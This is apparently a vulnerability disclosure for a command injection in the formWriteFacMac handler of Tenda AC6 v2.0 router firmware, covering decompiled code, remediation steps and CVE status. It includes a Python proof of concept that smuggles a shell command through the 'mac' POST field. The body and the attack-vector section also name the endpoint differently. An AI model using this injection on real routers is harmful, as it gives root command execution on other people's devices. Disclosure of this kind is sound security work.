# Tenda AC6 v2.0 V15.03.06.51 was discovered to contain a command injection vulnerability in formWriteFacMac

## Overview

- Vendor: Tenda
- Product: AC6 v2.0
- Version: V15.03.06.51
- Component: formWriteFacMac handler
- Vulnerability Class: CWE-78 command injection
- Manufacturer: https://www.tendacn.com/

## Affected version

- Package: `US_AC6V2.0RTL_V15.03.06.51_multi_TDE01.zip`.
- `bin/httpd`:.
- Architecture: MIPS little-endian, uClibc; binary includes symbols/debug info.

## Vulnerability details

`formWriteFacMac` reads the POST parameter `mac` and passes it directly to
`doSystemCmd` without any MAC-address format or character validation:

```c
void formWriteFacMac(webs_t wp, char_t *path, char_t *query)
{
  const char *mac = websGetVar(wp, "mac", "00:01:02:11:22:33");

  websWrite(wp, "modify mac only.");
  doSystemCmd("cfm mac %s", mac);
  websDone(wp, 200);
}
```

The handler is registered in `formDefineTendDa` with
`websFormDefine("WriteFacMac", formWriteFacMac)`, so the endpoint is
`POST /goform/WriteFacMac`. `mac` can contain `;`, backticks, or `$()`, which
are interpreted by the shell used by `doSystemCmd`.

Authentication: `R7WebsSecurityHandler` treats only `/goform/telnet` and
`/goform/ate` as pre-auth (and only when no admin password is set). `WriteFacMac`
is not in that list, so the handler requires an admin session. The security
handler checks a `password=` cookie and has no per-request CSRF token, so an
admin-CSRF vector is plausible.

## PoC

```python
import requests

url = "http://<router>/goform/WriteFacMac"
# Use a valid cookie from an admin session.
cookies = {"password": "<admin-cookie>"}
r = requests.post(
    url,
    data={"mac": "00:11:22:33:44:55; id > /tmp/facmac_pwned"},
    cookies=cookies,
    timeout=5,
)
print(r.status_code, r.text[:200])
```

## Reproduction and terminal evidence

Static evidence at this stage; the AC6 v2.0 rootfs has not been fully
rehosted. The handler, the `doSystemCmd` call, and the `WriteFacMac`
registration are from the unmodified `bin/httpd`:

```
formWriteFacMac 0x4504b4:
  mac = websGetVar(wp, "mac", "00:01:02:11:22:33");
  doSystemCmd("cfm mac %s", mac);

formDefineTendDa:
  websFormDefine("WriteFacMac", formWriteFacMac);
```

## Impact

Authenticated admin (or CSRF) root command execution. `cfm` is a root service;
the injected command runs in the same shell context as `doSystemCmd`.

## Remediation

- Validate `mac` as six octets (`%02x:%02x:%02x:%02x:%02x:%02x`) before use.
- Use an argv-based `execve` call for `cfm`; do not pass the value through a
  shell.
- Add CSRF tokens to configuration handlers.

## Known CVE relation

**CVE candidate type: new affected version (AC6 v2.0 V15.03.06.51) of the public formWriteFacMac pattern — candidate new CVE.**

- The same `formWriteFacMac` handler is publicly documented for other Tenda
  models (for example the AC10U research set). This report documents a newer
  AC6 v2.0 V15.03.06.51 build; vendor/CNA should confirm whether an existing
  CVE covers this version. If not, it is a new affected version.

## Status and disclosure

Static confirmation (decompilation; handler and registration unchanged).
Dynamic pending. Candidate new CVE — new affected version (AC6 v2.0 V15.03.06.51) of the public formWriteFacMac pattern; no CVE assigned. No vendor or
CNA contact.

## Additional Information

```markdown
### Vendor
Tenda

### Product
AC6 v2.0

### Version or Commit
V15.03.06.51

### Vulnerability Class
CWE-78 command injection

### CVE_candidate_type
new affected version (AC6 v2.0 V15.03.06.51) of the public formWriteFacMac pattern — candidate new CVE

### Description
formWriteFacMac passes the mac POST parameter directly to doSystemCmd without MAC-format or character validation.

### Affected_component
formWriteFacMac handler

### Attack_vector
Authenticated POST to /goform/formWriteFacMac with a crafted mac.

### Product_version
AC6 v2.0 V15.03.06.51

### Reference
- https://www.tendacn.com/
- https://github.com/vuln-1/vuln/blob/main/Tenda/AC6v2_V15.03.06.51/report-2.md
```
